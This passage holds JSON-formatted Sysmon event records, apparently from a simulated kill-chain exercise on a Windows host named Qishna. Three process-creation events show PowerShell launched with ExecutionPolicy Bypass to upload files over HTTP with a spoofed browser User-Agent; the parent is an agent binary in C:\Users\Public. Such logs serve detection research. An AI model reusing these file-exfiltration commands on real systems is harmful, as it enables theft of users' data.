"{4e85e66a-1016-5f31-8b72-060000000000}", "LogonId": "0x000000000006728b", "TerminalSessionId": 1, "IntegrityLevel": "High", "Hashes": "MD5=CDA48FC75952AD12D99E526D0B6BF70A,SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53,IMPHASH=A7CEFACDDA74B13CD330390769752481", "ParentProcessGuid": "{4e85e66a-05a8-5f35-0242-000000004300}", "ParentProcessId": 11772, "ParentImage": "C:\\Users\\Public\\savscan.exe", "ParentCommandLine": "\"C:\\Users\\Public\\savscan.exe\" -socket 0.0.0.0:7010 -http http://127.0.0.1:8888 -contact tcp "}, "fields": {"time": 1597304817.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:46:57.451597"}, "EventRecordID": 19204, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:46:57.443", "ProcessGuid": "{4e85e66a-5261-5f35-2e46-000000004300}", "ProcessId": 16848, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Temp\\__PSScriptPolicyTest_1e0nuuge.ugp.ps1", "CreationUtcTime": "2020-08-13 14:46:57.443"}, "fields": {"time": 1597304817.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:46:57.469072"}, "EventRecordID": 19205, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:46:57.447", "ProcessGuid": "{4e85e66a-5261-5f35-2e46-000000004300}", "ProcessId": 16848, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Temp\\__PSScriptPolicyTest_gywvocwd.4of.psm1", "CreationUtcTime": "2020-08-13 14:46:57.446"}, "fields": {"time": 1597304817.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 17}, "Version": 1, "Level": 4, "Task": 17, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:46:57.550240"}, "EventRecordID": 19206, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "PipeEvent include Group", "EventType": "CreatePipe", "UtcTime": "2020-08-13 14:46:57.517", "ProcessGuid": "{4e85e66a-5261-5f35-2e46-000000004300}", "ProcessId": 16848, "PipeName": "\\PSHost.132418036173358990.16848.DefaultAppDomain.powershell", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}, "fields": {"time": 1597304817.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:46:58.004152"}, "EventRecordID": 19207, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:46:58.003", "ProcessGuid": "{4e85e66a-5261-5f35-2e46-000000004300}", "ProcessId": 16848, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\StartupProfileData-NonInteractive", "CreationUtcTime": "2019-08-09 14:16:02.521"}, "fields": {"time": 1597304818.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 1}, "Version": 5, "Level": 4, "Task": 1, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:47:01.353634"}, "EventRecordID": 19208, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "ProcessCreate include Group", "UtcTime": "2020-08-13 14:47:01.343", "ProcessGuid": "{4e85e66a-5265-5f35-2f46-000000004300}", "ProcessId": 10248, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "FileVersion": "10.0.18362.1 (WinBuild.160101.0800)", "Description": "Windows PowerShell", "Product": "Microsoft\u00ae Windows\u00ae Operating System", "Company": "Microsoft Corporation", "OriginalFileName": "PowerShell.EXE", "CommandLine": "powershell.exe -ExecutionPolicy Bypass -C \"$ErrorActionPreference = 'Stop';$fieldName = 'displayName=Windows` Defender';$filePath = 'displayName=Windows` Defender';$url = \\\"://None:None/file/upload\\\";Add-Type -AssemblyName 'System.Net.Http';$client = New-Object System.Net.Http.HttpClient;$content = New-Object System.Net.Http.MultipartFormDataContent;$fileStream = [System.IO.File]::OpenRead($filePath);$fileName = [System.IO.Path]::GetFileName($filePath);$fileContent = New-Object System.Net.Http.StreamContent($fileStream);$content.Add($fileContent, $fieldName, $fileName);$client.DefaultRequestHeaders.Add(\\\"X-Request-Id\\\", $env:COMPUTERNAME + '-ajpfgl');$client.DefaultRequestHeaders.Add(\\\"User-Agent\\\",\\\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\\\");$result = $client.PostAsync($url, $content).Result;$result.EnsureSuccessStatusCode();\"", "CurrentDirectory": "C:\\Windows\\system32\\", "User": "QISHNA\\garip", "LogonGuid": "{4e85e66a-1016-5f31-8b72-060000000000}", "LogonId": "0x000000000006728b", "TerminalSessionId": 1, "IntegrityLevel": "High", "Hashes": "MD5=CDA48FC75952AD12D99E526D0B6BF70A,SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53,IMPHASH=A7CEFACDDA74B13CD330390769752481", "ParentProcessGuid": "{4e85e66a-05a8-5f35-0242-000000004300}", "ParentProcessId": 11772, "ParentImage": "C:\\Users\\Public\\savscan.exe", "ParentCommandLine": "\"C:\\Users\\Public\\savscan.exe\" -socket 0.0.0.0:7010 -http http://127.0.0.1:8888 -contact tcp "}, "fields": {"time": 1597304821.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:47:01.595055"}, "EventRecordID": 19209, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:47:01.511", "ProcessGuid": "{4e85e66a-5265-5f35-2f46-000000004300}", "ProcessId": 10248, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Temp\\__PSScriptPolicyTest_yrja54j2.uzz.ps1", "CreationUtcTime": "2020-08-13 14:47:01.511"}, "fields": {"time": 1597304821.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:47:01.595510"}, "EventRecordID": 19210, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:47:01.515", "ProcessGuid": "{4e85e66a-5265-5f35-2f46-000000004300}", "ProcessId": 10248, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Temp\\__PSScriptPolicyTest_5sgefcyl.uz3.psm1", "CreationUtcTime": "2020-08-13 14:47:01.515"}, "fields": {"time": 1597304821.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 17}, "Version": 1, "Level": 4, "Task": 17, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:47:01.635006"}, "EventRecordID": 19211, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "PipeEvent include Group", "EventType": "CreatePipe", "UtcTime": "2020-08-13 14:47:01.605", "ProcessGuid": "{4e85e66a-5265-5f35-2f46-000000004300}", "ProcessId": 10248, "PipeName": "\\PSHost.132418036213439991.10248.DefaultAppDomain.powershell", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}, "fields": {"time": 1597304821.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:47:02.078062"}, "EventRecordID": 19212, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:47:02.077", "ProcessGuid": "{4e85e66a-5265-5f35-2f46-000000004300}", "ProcessId": 10248, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\StartupProfileData-NonInteractive", "CreationUtcTime": "2019-08-09 14:16:02.521"}, "fields": {"time": 1597304822.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 1}, "Version": 5, "Level": 4, "Task": 1, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:47:05.350508"}, "EventRecordID": 19213, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "ProcessCreate include Group", "UtcTime": "2020-08-13 14:47:05.343", "ProcessGuid": "{4e85e66a-5269-5f35-3046-000000004300}", "ProcessId": 19308, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "FileVersion": "10.0.18362.1 (WinBuild.160101.0800)", "Description": "Windows PowerShell", "Product": "Microsoft\u00ae Windows\u00ae Operating System", "Company": "Microsoft Corporation", "OriginalFileName": "PowerShell.EXE", "CommandLine": "powershell.exe -ExecutionPolicy Bypass -C \"$ErrorActionPreference = 'Stop';$fieldName = 'instanceGuid={D68DDC3A-831F-4fae-9E44-DA132C1ACF46}';$filePath = 'instanceGuid={D68DDC3A-831F-4fae-9E44-DA132C1ACF46}';$url = \\\"://None:None/file/upload\\\";Add-Type -AssemblyName 'System.Net.Http';$client = New-Object System.Net.Http.HttpClient;$content = New-Object System.Net.Http.MultipartFormDataContent;$fileStream = [System.IO.File]::OpenRead($filePath);$fileName = [System.IO.Path]::GetFileName($filePath);$fileContent = New-Object System.Net.Http.StreamContent($fileStream);$content.Add($fileContent, $fieldName, $fileName);$client.DefaultRequestHeaders.Add(\\\"X-Request-Id\\\", $env:COMPUTERNAME + '-ajpfgl');$client.DefaultRequestHeaders.Add(\\\"User-Agent\\\",\\\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\\\");$result = $client.PostAsync($url, $content).Result;$result.EnsureSuccessStatusCode();\"", "CurrentDirectory": "C:\\Windows\\system32\\", "User": "QISHNA\\garip", "LogonGuid": "{4e85e66a-1016-5f31-8b72-060000000000}", "LogonId": "0x000000000006728b", "TerminalSessionId": 1, "IntegrityLevel": "High", "Hashes": "MD5=CDA48FC75952AD12D99E526D0B6BF70A,SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53,IMPHASH=A7CEFACDDA74B13CD330390769752481", "ParentProcessGuid": "{4e85e66a-05a8-5f35-0242-000000004300}", "ParentProcessId": 11772, "ParentImage": "C:\\Users\\Public\\savscan.exe", "ParentCommandLine": "\"C:\\Users\\Public\\savscan.exe\" -socket 0.0.0.0:7010 -http http://127.0.0.1:8888 -contact tcp "}, "fields": {"time": 1597304825.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:47:05.456675"}, "EventRecordID": 19214, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:47:05.441", "ProcessGuid": "{4e85e66a-5269-5f35-3046-000000004300}", "ProcessId": 19308, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Temp\\__PSScriptPolicyTest_qjzm3q1m.hfp.ps1", "CreationUtcTime": "2020-08-13 14:47:05.441"}, "fields": {"time": 1597304825.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:47:05.474119"}, "EventRecordID": 19215, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:47:05.445", "ProcessGuid": "{4e85e66a-5269-5f35-3046-000000004300}", "ProcessId": 19308, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Temp\\__PSScriptPolicyTest_ud2cc3yp.v51.psm1", "CreationUtcTime": "2020-08-13 14:47:05.444"}, "fields": {"time": 1597304825.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 17}, "Version": 1, "Level": 4, "Task": 17, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:47:05.547409"}, "EventRecordID": 19216, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "PipeEvent include Group", "EventType": "CreatePipe", "UtcTime": "2020-08-13 14:47:05.511", "ProcessGuid": "{4e85e66a-5269-5f35-3046-000000004300}", "ProcessId": 19308, "PipeName": "\\PSHost.132418036253433161.19308.DefaultAppDomain.powershell", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}, "fields": {"time": 1597304825.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:47:05.963284"}, "EventRecordID": 19217, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:47:05.962", "ProcessGuid": "{4e85e66a-5269-5f35-3046-000000004300}", "ProcessId": 19308, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\StartupProfileData-NonInteractive", "CreationUtcTime": "2019-08-09 14:16:02.521"}, "fields": {"time": 1597304825.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 1}, "Version": 5, "Level": 4, "Task": 1, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:47:09.356188"}, "EventRecordID": 19218, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "ProcessCreate include Group", "UtcTime": "2020-08-13 14:47:09.348", "ProcessGuid": "{4e85e66a-526d-5f35-3146-000000004300}", "ProcessId": 11420, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "FileVersion": "10.0.18362.1 (WinBuild.160101.0800)", "Description": "Windows PowerShell", "Product": "Microsoft\u00ae Windows\u00ae Operating System", "Company": "Microsoft Corporation", "OriginalFileName": "PowerShell.EXE", "CommandLine": "powershell.exe -ExecutionPolicy Bypass -C \"$ErrorActionPreference = 'Stop';$fieldName = 'pathToSignedProductExe=windowsdefender://';$filePath = 'pathToSignedProductExe=windowsdefender://';$url = \\\"://None:None/file/upload\\\";Add-Type -AssemblyName 'System.Net.Http';$client = New-Object System.Net.Http.HttpClient;$content = New-Object System.Net.Http.MultipartFormDataContent;$fileStream = [System.IO.File]::OpenRead($filePath);$fileName = [System.IO.Path]::GetFileName($filePath);$fileContent = New-Object System.Net.Http.StreamContent($fileStream);$content.Add($fileContent, $fieldName, $fileName);$client.DefaultRequestHeaders.Add(\\\"X-Request-Id\\\", $env:COMPUTERNAME + '-ajpfgl');$client.DefaultRequestHeaders.Add(\\\"User-Agent\\\",\\\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\\\");$result = $client.PostAsync($url, $content).Result;$result.EnsureSuccessStatusCode();\"", "CurrentDirectory": "C:\\Windows\\system32\\", "User": "QISHNA\\garip", "LogonGuid": "{4e85e66a-1016-5f31-8b72-060000000000}", "LogonId": "0x000000000006728b", "TerminalSessionId": 1, "IntegrityLevel": "High", "Hashes": "MD5=CDA48FC75952AD12D99E526D0B6BF70A,SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53,IMPHASH=A7CEFACDDA74B13CD330390769752481", "ParentProcessGuid": "{4e85e66a-05a8-5f35-0242-000000004300}", "ParentProcessId": 11772, "ParentImage": "C:\\Users\\Public\\savscan.exe", "ParentCommandLine": "\"C:\\Users\\Public\\savscan.exe\" -socket 0.0.0.0:7010 -http http://127.0.0.1:8888 -contact tcp "}, "fields": {"time": 1597304829.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:47:09.483343"}, "EventRecordID": 19219, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:47:09.452", "ProcessGuid": "{4e85e66a-526d-5f35-3146-000000004300}", "ProcessId": 11420, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Temp\\__PSScriptPolicyTest_mpr1rqms.qmc.ps1", "CreationUtcTime": "2020-08-13 14:47:09.452"}, "fields": {"time": 1597304829.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
